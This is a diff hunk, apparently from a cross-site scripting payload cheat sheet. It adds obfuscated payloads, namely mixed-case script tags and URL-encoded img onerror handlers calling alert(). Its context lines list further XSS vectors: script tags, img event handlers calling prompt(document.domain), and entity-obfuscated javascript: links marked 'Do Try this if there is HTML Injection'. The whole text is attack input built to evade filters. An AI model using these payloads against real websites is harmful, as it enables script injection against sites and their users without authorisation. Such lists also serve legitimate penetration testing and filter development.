@@ -8,6 +8,9 @@
 </TITLE><SCRIPT>alert(document.domain);</SCRIPT> 
 <<SCRIPT>alert("XSS");//\<</SCRIPT>
 `[{\"displayName\":\"<img src=x onmouseover=prompt(document.domain)>\"}]`
+</title><scRipt>alert(0x00C57D)</scRipt>
+<iMg src%3dN onerror%3dalert(0x0036A9)>
+<iMg src%3dN onerror%3dalert(0x000D98)>
 `<img/src/onerror=prompt(document.domain)>`
 <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>     --> Do Try this if there is HTML Injection
 <a href="javascript:alert(document.domain)">XSS</a>                                --> Do Try this if there is HTML Injection
